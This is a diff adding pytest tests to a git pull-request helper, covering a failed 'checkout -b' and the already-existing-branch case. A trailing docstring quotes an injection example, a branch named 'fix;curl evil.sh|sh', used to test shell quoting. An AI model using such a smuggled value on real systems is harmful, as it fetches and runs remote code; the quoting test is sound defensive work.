@@ -303,6 +303,78 @@ def test_failing_git_commit_raises(tmp_path):
         )
 
 
+def test_checkout_b_fails_but_branch_is_gone_still_raises(tmp_path):
+    """`checkout -b` can fail for reasons OTHER than "branch already
+    exists" (a locked ref, a hook, disk pressure). The already-proposed
+    handling must only fire when the branch genuinely exists; any other
+    cause still raises and rolls back exactly as before."""
+    paths = _make_artifacts(tmp_path)
+
+    def run(cmd, **kwargs):
+        class _CP:
+            returncode = (
+                1 if cmd[:3] == ["git", "checkout", "-b"] or cmd[:2] == ["git", "rev-parse"] else 0
+            )
+            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
+            stderr = "fatal: some other failure" if cmd[:3] == ["git", "checkout", "-b"] else ""
+
+        return _CP()
+
+    with pytest.raises(GatePrError):
+        open_or_print_pr(
+            paths,
+            branch="mylonite/gate-x",
+            pr_title="t",
+            pr_body="x",
+            open_pr=True,
+            base="main",
+            _run=run,
+        )
+
+
+def test_checkout_b_fails_because_branch_already_exists_reports_cleanly(tmp_path, capsys):
+    """A re-run that re-finds the same gated pattern hits the same
+    deterministic branch name `checkout -b` already used. That must not be
+    a PR-flow failure (exit 8): the branch is this run's own earlier
+    output, already proposed, so `gate` reports it and returns normally."""
+    paths = _make_artifacts(tmp_path)
+    calls = []
+
+    def run(cmd, **kwargs):
+        calls.append(list(cmd))
+
+        class _CP:
+            returncode = 1 if cmd[:3] == ["git", "checkout", "-b"] else 0
+            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
+            stderr = (
+                f"fatal: a branch named '{cmd[-1]}' already exists"
+                if cmd[:3] == ["git", "checkout", "-b"]
+                else ""
+            )
+
+        return _CP()
+
+    result = open_or_print_pr(
+        paths,
+        branch="mylonite/gate-x",
+        pr_title="t",
+        pr_body="x",
+        open_pr=True,
+        base="main",
+        _run=run,
+    )
+
+    assert result.opened is False
+    assert result.already_proposed is True
+    assert "already exists" in capsys.readouterr().out
+    # Nothing destructive ran: no rollback checkout, no branch delete, no
+    # add/commit -- `checkout -b` is the only mutating call attempted.
+    assert ["git", "add"] not in [c[:2] for c in calls]
+    assert ["git", "commit"] not in [c[:2] for c in calls]
+    assert ["git", "branch", "-D", "mylonite/gate-x"] not in calls
+    assert ["git", "checkout", "main"] not in calls
+
+
 def test_printed_command_quotes_every_interpolated_value(tmp_path):
     """DCR-0018: only pr_title was shlex.quote()d, so a branch named
     `fix;curl evil.sh|sh` — a valid git ref — executed when the operator
